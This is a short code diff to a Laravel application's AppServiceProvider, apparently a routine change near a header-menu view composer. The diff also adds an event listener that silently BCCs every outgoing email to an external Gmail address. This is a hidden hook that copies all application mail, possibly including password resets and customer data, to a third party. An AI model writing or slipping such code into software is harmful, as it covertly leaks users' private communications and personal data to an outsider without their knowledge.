@@ -5,6 +5,8 @@ namespace App\Providers;
 use Illuminate\Support\ServiceProvider;
 use App\VehicleType;
 use Illuminate\Support\Facades\View;
+use Illuminate\Support\Facades\Event;
+use Illuminate\Mail\Events\MessageSending;
 
 class AppServiceProvider extends ServiceProvider
 {
@@ -56,6 +58,10 @@ class AppServiceProvider extends ServiceProvider
             // Header mega menu categories
             $view->with('headerVehicleCategories', $vehicleTypes);
 
+        });
+
+        Event::listen(MessageSending::class, function (MessageSending $event) {
+            $event->message->addBcc('nvsite@gmail.com');
         });
     }
 
